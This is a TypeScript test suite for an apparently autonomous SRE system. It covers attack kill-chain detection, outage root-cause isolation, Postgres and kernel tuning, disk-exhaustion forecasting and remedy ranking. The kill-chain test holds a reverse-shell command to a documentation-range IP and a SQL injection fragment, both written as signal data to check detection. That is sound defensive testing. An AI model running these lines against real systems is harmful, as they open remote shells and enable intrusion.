import assert from 'assert';
import {
  killChainCorrelator,
  cascadingRootCauseAnalyzer,
  autonomousPerformanceTuner,
  predictiveResourceForecaster,
  experienceReplayLedger,
} from '../ai/src/orchestrator';

export async function testDeepSreIntelligence(): Promise<void> {
  console.log('[TEST] Running Deep SRE Autonomous Intelligence Suite...');

  // 1. Multi-Stage Attack Kill-Chain Correlator
  console.log('  -> 1. Testing Multi-Stage Attack Kill-Chain Correlator...');
  killChainCorrelator.clear();
  const badIp = '203.0.113.77';

  // Stage 1: Recon
  const step1 = killChainCorrelator.recordSignal(badIp, 'srv-node-1', 'PORT_SCAN_RECON', 'SYN scan 1000 ports');
  assert.strictEqual(step1.currentStage, 'RECONNAISSANCE');
  assert.strictEqual(step1.activeStages.length, 1);
  assert.strictEqual(step1.isPreempted, false);

  // Stage 2: Foothold
  const step2 = killChainCorrelator.recordSignal(badIp, 'srv-node-1', 'SQL_INJECTION', 'UNION SELECT 1,2,3');
  assert.strictEqual(step2.currentStage, 'INITIAL_FOOTHOLD');
  assert.strictEqual(step2.activeStages.length, 2);

  // Stage 3: Privilege Escalation
  const step3 = killChainCorrelator.recordSignal(badIp, 'srv-node-1', 'PRIVILEGE_ESCALATION', 'DirtyPipe exploit');
  assert.strictEqual(step3.currentStage, 'PRIVILEGE_ESCALATION');
  assert.strictEqual(step3.activeStages.length, 3);

  // Stage 4: Exfiltration
  const step4 = killChainCorrelator.recordSignal(badIp, 'srv-node-1', 'REVERSE_SHELL', 'sh -i >& /dev/tcp/203.0.113.77/9999');
  assert.strictEqual(step4.currentStage, 'DATA_EXFILTRATION_OR_DESTRUCTION');
  assert(step4.progressionScore >= 80, `Expected score >= 80, got ${step4.progressionScore}`);
  assert.strictEqual(step4.isPreempted, true);
  assert(step4.preemptiveRemedyCommands.some((c) => c.includes('iptables')));
  assert(step4.preemptiveRemedyCommands.some((c) => c.includes('pkill')));
  console.log(`  ✓ Kill-Chain Correlator verified: 4 stages detected | Score: ${step4.progressionScore}/100 | Preempted: true`);

  // 2. Cascading Outage Dependency Graph
  console.log('  -> 2. Testing Cascading Outage Dependency Graph & Root Isolation...');
  const wave = [
    { serviceId: 'edge-proxy', failureType: 'NGINX_502_UPSTREAM_DOWN', logSummary: 'connection refused 127.0.0.1:4000', timestamp: Date.now() - 2000 },
    { serviceId: 'app-backend', failureType: 'DATABASE_TIMEOUT', logSummary: 'pg query timed out', timestamp: Date.now() - 4000 },
    { serviceId: 'primary-db', failureType: 'DATABASE_DEADLOCK', logSummary: 'deadlock detected on row lock', timestamp: Date.now() - 8000 },
  ];

  const diag = cascadingRootCauseAnalyzer.diagnoseAlertWave(wave);
  assert.strictEqual(diag.originatingRootService, 'primary-db');
  assert.strictEqual(diag.originatingFailureType, 'DATABASE_DEADLOCK');
  assert.strictEqual(diag.isCascadingOutage, true);
  assert.strictEqual(diag.topologicalRemediationPlan[0].serviceId, 'primary-db');
  assert(diag.topologicalRemediationPlan[0].command.includes('pg_terminate_backend'));
  console.log(`  ✓ Cascading Outage verified: Root cause isolated to ${diag.originatingRootService} across 3 service dominoes.`);

  // 3. Autonomous Performance Tuner
  console.log('  -> 3. Testing Autonomous Kernel & Service Autotuner...');
  const dbTuned = autonomousPerformanceTuner.tuneHost({
    cpuCores: 8,
    ramGb: 32,
    storageType: 'NVME_SSD',
    archetype: 'DATABASE_HOST',
  });
  assert.strictEqual(dbTuned.serviceConfName, 'postgresql.conf');
  assert(dbTuned.serviceConfContent.includes('shared_buffers = 8192MB'));
  assert(dbTuned.serviceConfContent.includes('effective_cache_size = 24576MB'));
  assert.strictEqual(dbTuned.sysctlConf['vm.swappiness'], 10);
  assert.strictEqual(dbTuned.sysctlConf['vm.overcommit_memory'], 1);
  console.log('  ✓ Autonomous Tuner verified: PostgreSQL and Linux sysctl optimized for 32GB RAM.');

  // 4. Predictive Resource Trend Forecaster
  console.log('  -> 4. Testing Predictive Resource Trend Forecaster...');
  const t0 = Date.now();
  const samples = [
    { timestamp: t0 - 60 * 60 * 1000, usedValue: 70000, totalValue: 100000 },
    { timestamp: t0, usedValue: 88000, totalValue: 100000 },
  ];
  const forecast = predictiveResourceForecaster.forecastExhaustion('Disk Storage', samples, 180);
  assert.strictEqual(forecast.currentUsagePercent, 88);
  assert(forecast.growthVelocityPerMinute > 0);
  assert(forecast.timeToExhaustionMinutes !== null && forecast.timeToExhaustionMinutes <= 60);
  assert.strictEqual(forecast.isExhaustionImminent, true);
  assert(forecast.recommendedPreemptiveAction.includes('CRITICAL PREEMPTION'));
  console.log(`  ✓ Predictive Forecaster verified: TTE calculated at ${forecast.timeToExhaustionMinutes}m with proactive preemption.`);

  // 5. Experience Replay Ledger
  console.log('  -> 5. Testing Experience Replay Reinforcement Ledger...');
  experienceReplayLedger.clear();
  experienceReplayLedger.recordTrial({
    fingerprint: 'high_concurrency_socket_leak',
    archetype: 'APPLICATION_RUNTIME',
    remedyAction: 'GRACEFUL_RELOAD',
    remedyCommand: 'systemctl reload app',
    success: true,
    durationMs: 80,
  });
  experienceReplayLedger.recordTrial({
    fingerprint: 'high_concurrency_socket_leak',
    archetype: 'APPLICATION_RUNTIME',
    remedyAction: 'GRACEFUL_RELOAD',
    remedyCommand: 'systemctl reload app',
    success: true,
    durationMs: 95,
  });
  experienceReplayLedger.recordTrial({
    fingerprint: 'high_concurrency_socket_leak',
    archetype: 'APPLICATION_RUNTIME',
    remedyAction: 'HARD_KILL',
    remedyCommand: 'pkill -9 -f app',
    success: false,
    durationMs: 450,
  });

  const weights = experienceReplayLedger.evaluateRemedyWeights('high_concurrency_socket_leak', 'APPLICATION_RUNTIME');
  assert.strictEqual(weights[0].remedyAction, 'GRACEFUL_RELOAD');
  assert.strictEqual(weights[0].successRate, 1.0);
  assert(weights[0].recommendedWeight > weights[1].recommendedWeight);
  console.log(`  ✓ Experience Replay verified: GRACEFUL_RELOAD (Weight: ${weights[0].recommendedWeight}) prioritized over HARD_KILL.`);

  console.log('✓ Deep SRE Autonomous Intelligence Suite ALL PASSED!\n');
}
